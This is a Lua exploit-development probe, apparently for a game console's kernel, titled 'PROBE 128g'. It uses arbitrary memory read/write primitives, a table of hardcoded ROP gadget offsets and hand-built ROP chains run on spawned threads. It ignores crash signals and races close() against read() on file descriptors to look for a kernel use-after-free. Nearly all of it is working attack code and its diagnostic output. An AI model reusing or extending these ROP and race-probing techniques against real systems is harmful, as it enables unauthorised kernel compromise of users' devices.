-- CRASH_CLASS: MODERATE
-- PROBE 128g: Controlled fd close/read race
--
-- 128e died from fd-reuse: child close(23) loop clobbered loader fds.
-- Fix: dup2 to high fd (900+), child does ONE close, all signals ignored.
--
-- Section A: Non-blocking — socket read concurrent with child close
-- Section B: Blocking — pipe read blocks, child closes during block

print("=== PROBE 128g: CONTROLLED FD CLOSE/READ RACE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l
    if type(v) == "table" and v.h then h, l = v.h, v.l
    else h, l = 0, N(v) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sa = syscall.syscall_address
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end
print(string.format("eboot=0x%X%08X", text_hi, text_lo))

local function eaddr(off)
    return uint64(string.format("0x%X%08X", text_hi, text_lo + off))
end

local G = {
    ret      = 0x42,
    pop_rax  = 0x992,
    pop_rsp  = 0x9A2,
    pop_rdi  = 0xC9DFE,
    pop_rsi  = 0xD77D,
    mov_w    = 0x92C67,
    jmp_loop = 0x15481,
}

local rip_lo = (text_lo + G.ret) % 0x100000000
local rip_hi = text_hi + math.floor((text_lo + G.ret) / 0x100000000)

local sc_sigaction = mk(416)
local sc_socket = mk(97)
local sc_close = mk(6)
local sc_read = mk(3)
local sc_dup2 = mk(90)
local sc_pipe = mk(42)

-- Helper: spawn child thread running a ROP chain
local function spawn_child(chain_fn)
    local stk = memory.alloc(0x8000)
    local CB = N(stk) + 0x4000
    chain_fn(CB)

    local ctx = memory.alloc(0x500)
    local tid_buf = memory.alloc(8)
    local BC = N(ctx)
    for off = 0, 0x4BC, 4 do wd(BC + off, 0) end
    wd(BC + 0x108, 0x480); wd(BC + 0xD0, 0); wd(BC + 0x110, 0x10000)
    wd(BC + 0xC0, 0x43); wd(BC + 0x100, 0x3B)
    wd(BC + 0xE0, rip_lo); wd(BC + 0xE4, rip_hi)
    local rsp_lo = CB % 0x100000000
    local rsp_hi = math.floor(CB / 0x100000000)
    wd(BC + 0xF8, rsp_lo); wd(BC + 0xFC, rsp_hi)
    wq(N(tid_buf), uint64("0x0"))
    local tr = nil
    pcall(function() tr = mk(430)(ctx, tid_buf, uint64(0)) end)
    return tr, rq(N(tid_buf))
end

-- Helper: build ROP chain segment (returns next offset)
local function chain_nanosleep(CB, p, ts_addr)
    wq(CB + p, eaddr(G.pop_rax)); p = p + 8
    wq(CB + p, uint64(240));      p = p + 8
    wq(CB + p, eaddr(G.pop_rdi)); p = p + 8
    wq(CB + p, uint64(string.format("0x%X", ts_addr))); p = p + 8
    wq(CB + p, eaddr(G.pop_rsi)); p = p + 8
    wq(CB + p, uint64(0));        p = p + 8
    wq(CB + p, sa);               p = p + 8
    return p
end

local function chain_close(CB, p, fd_num)
    wq(CB + p, eaddr(G.pop_rax)); p = p + 8
    wq(CB + p, uint64(6));        p = p + 8
    wq(CB + p, eaddr(G.pop_rdi)); p = p + 8
    wq(CB + p, uint64(fd_num));   p = p + 8
    wq(CB + p, sa);               p = p + 8
    return p
end

local function chain_sentinel(CB, p, sent_addr, value)
    wq(CB + p, eaddr(G.pop_rdi)); p = p + 8
    wq(CB + p, uint64(string.format("0x%X", sent_addr))); p = p + 8
    wq(CB + p, eaddr(G.pop_rax)); p = p + 8
    wq(CB + p, uint64(value));    p = p + 8
    wq(CB + p, eaddr(G.mov_w));   p = p + 8
    return p
end

local function chain_spin(CB, p)
    wq(CB + p, eaddr(G.jmp_loop)); p = p + 8
    return p
end

-- [SETUP] Ignore SIGPIPE(13), SIGBUS(10), SIGSEGV(11)
print("")
print("[SETUP] Signal handlers")
local act = memory.alloc(0x40)
for off = 0, 0x3C, 4 do wd(N(act) + off, 0) end
for _, sig in ipairs({13, 10, 11}) do
    wq(N(act), uint64(1))
    wd(N(act) + 8, 0)
    local sr = nil
    pcall(function()
        sr = sc_sigaction(uint64(sig), act, uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    print(string.format("  sig %d IGN: %s", sig, fmt(sr)))
end
if not alive() then print("DIED setup!") return end

-- ===== SECTION A: Non-blocking race =====
print("")
print("[A] Non-blocking socket close/read race")

local sfd = nil
pcall(function() sfd = sc_socket(uint64(2), uint64(1), uint64(0)) end)
if sfd == nil or N(sfd) < 0 then
    pcall(function() sfd = sc_socket(uint64(2), uint64(2), uint64(0)) end)
end

if sfd == nil or N(sfd) < 0 then
    print("  socket failed, skip A")
else
    local orig_fd = N(sfd)

    local d2 = nil
    pcall(function() d2 = sc_dup2(uint64(orig_fd), uint64(900)) end)
    print(string.format("  fd=%d dup2→900: %s", orig_fd, fmt(d2)))

    if d2 == nil or N(d2) ~= 900 then
        print("  dup2 failed, using orig fd " .. orig_fd .. " (risk: fd reuse)")
    else
        pcall(function() sc_close(uint64(orig_fd)) end)
    end

    local target_fd = (d2 and N(d2) == 900) and 900 or orig_fd

    -- Timespec: 2ms delay
    local ts_a = memory.alloc(16)
    wq(N(ts_a), uint64(0))
    wq(N(ts_a) + 8, uint64(2000000))

    local shared_a = memory.alloc(0x100)
    local SENT_A = N(shared_a)
    wq(SENT_A, uint64(0))

    local tr_a, tid_a = spawn_child(function(CB)
        local p = 0
        p = chain_nanosleep(CB, p, N(ts_a))
        p = chain_close(CB, p, target_fd)
        p = chain_sentinel(CB, p, SENT_A, "0xAAAAAAAAAAAAAAAA")
        p = chain_spin(CB, p)
    end)
    print(string.format("  child: ret=%s tid=%s", fmt(tr_a), fmt(tid_a)))

    if tr_a and N(tr_a) == 0 then
        local rbuf = memory.alloc(256)
        local r_ok, r_err, r_crash, r_data = 0, 0, 0, 0

        for i = 1, 500 do
            local rr = nil
            local rok = pcall(function()
                rr = sc_read(uint64(target_fd), rbuf, uint64(128))
            end)

            if not rok then
                r_crash = r_crash + 1
            elseif rr == nil then
                r_err = r_err + 1
            else
                local rv = N(rr)
                if rv > 0 and rv < 0x10000 then
                    r_data = r_data + 1
                else
                    r_err = r_err + 1
                end
            end

            if not alive() then
                print(string.format("  *** DIED at read %d ***", i))
                print(string.format("  ok=%d err=%d crash=%d data=%d", r_ok, r_err, r_crash, r_data))
                return
            end
        end

        print(string.format("  500 reads: err=%d crash=%d data=%d", r_err, r_crash, r_data))
        local sa_val = rq(SENT_A)
        print(string.format("  sentinel=%s %s", fmt(sa_val),
            (sa_val and N(sa_val) ~= 0) and "(child completed close)" or "(child still sleeping)"))

        if r_data > 0 then
            print("  *** READ RETURNED DATA — POSSIBLE UAF ***")
            local dump = ""
            for off = 0, 31 do
                local b = rd(N(rbuf) + off)
                if b then dump = dump .. string.format("%02X ", b % 256) end
            end
            print("  buf: " .. dump)
        end
        if r_crash > 0 then
            print("  *** PCALL CRASHES — KERNEL ISSUE ***")
        end
    else
        print("  thread creation failed!")
        pcall(function() sc_close(uint64(target_fd)) end)
    end
end

if not alive() then print("DEAD AFTER A!") return end

-- ===== SECTION B: Blocking read race (pipe or socketpair) =====
print("")
print("[B] Blocking pipe/socket close/read race")

local read_fd = nil
local write_fd = nil

-- Try pipe(42)
local pipe_buf = memory.alloc(16)
wd(N(pipe_buf), 0); wd(N(pipe_buf) + 4, 0)
local pr = nil
pcall(function() pr = sc_pipe(pipe_buf) end)
local p_r = rd(N(pipe_buf)) or 0
local p_w = rd(N(pipe_buf) + 4) or 0
print(string.format("  pipe() ret=%s r=%d w=%d", fmt(pr), p_r, p_w))

if pr and N(pr) >= 0 and p_r > 0 then
    read_fd = p_r
    write_fd = p_w
    print("  pipe works!")
else
    -- Try socketpair(135): AF_UNIX=1, SOCK_STREAM=1
    print("  pipe failed, trying socketpair(135)...")
    local sp_buf = memory.alloc(16)
    for off = 0, 12, 4 do wd(N(sp_buf) + off, 0) end
    local spr = nil
    pcall(function()
        spr = mk(135)(uint64(1), uint64(1), uint64(0), sp_buf)
    end)
    local sp_a = rd(N(sp_buf)) or 0
    local sp_b = rd(N(sp_buf) + 4) or 0
    print(string.format("  socketpair ret=%s a=%d b=%d", fmt(spr), sp_a, sp_b))
    if spr and N(spr) >= 0 and sp_a > 0 then
        read_fd = sp_a
        write_fd = sp_b
        print("  socketpair works!")
    end
end

if read_fd == nil then
    print("  no blocking fd source, skip B")
else
    -- dup2 read end to 901
    local d2b = nil
    pcall(function() d2b = sc_dup2(uint64(read_fd), uint64(901)) end)
    print(string.format("  dup2(%d,901)=%s", read_fd, fmt(d2b)))

    local target_b = 901
    if d2b and N(d2b) == 901 then
        pcall(function() sc_close(uint64(read_fd)) end)
    else
        print("  dup2 failed, using orig fd")
        target_b = read_fd
    end

    -- Timespec: 200ms
    local ts_b = memory.alloc(16)
    wq(N(ts_b), uint64(0))
    wq(N(ts_b) + 8, uint64(200000000))

    local shared_b = memory.alloc(0x100)
    local SENT_B = N(shared_b)
    wq(SENT_B, uint64(0))

    local tr_b, tid_b = spawn_child(function(CB)
        local p = 0
        p = chain_nanosleep(CB, p, N(ts_b))
        p = chain_close(CB, p, target_b)
        p = chain_sentinel(CB, p, SENT_B, "0xBBBBBBBBBBBBBBBB")
        p = chain_spin(CB, p)
    end)
    print(string.format("  child: ret=%s tid=%s", fmt(tr_b), fmt(tid_b)))

    if tr_b and N(tr_b) == 0 then
        print(string.format("  entering BLOCKING read(%d)... child closes in ~200ms", target_b))

        local rbuf2 = memory.alloc(256)
        local rr2 = nil
        local r2ok = pcall(function()
            rr2 = sc_read(uint64(target_b), rbuf2, uint64(128))
        end)

        print(string.format("  read returned! pcall=%s ret=%s", tostring(r2ok), fmt(rr2)))

        if r2ok and rr2 then
            local rv2 = N(rr2)
            if rv2 > 0 and rv2 < 0x10000 then
                print(string.format("  *** READ RETURNED %d BYTES — POSSIBLE UAF ***", rv2))
                local dump = ""
                for off = 0, math.min(31, rv2 - 1) do
                    local b = rd(N(rbuf2) + off)
                    if b then dump = dump .. string.format("%02X ", b % 256) end
                end
                print("  buf: " .. dump)
            elseif rv2 == 0 then
                print("  EOF — kernel closed cleanly (no UAF)")
            else
                print("  error return — kernel handled gracefully")
            end
        elseif not r2ok then
            print("  *** PCALL FAILED — POSSIBLE KERNEL CORRUPTION ***")
        end

        local sb_val = rq(SENT_B)
        print(string.format("  sentinel=%s", fmt(sb_val)))
    else
        print("  thread creation failed!")
    end

    pcall(function() sc_close(uint64(target_b)) end)
    pcall(function() sc_close(uint64(write_fd)) end)
end

if not alive() then print("DEAD AFTER B!") return end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 128g COMPLETE ===")
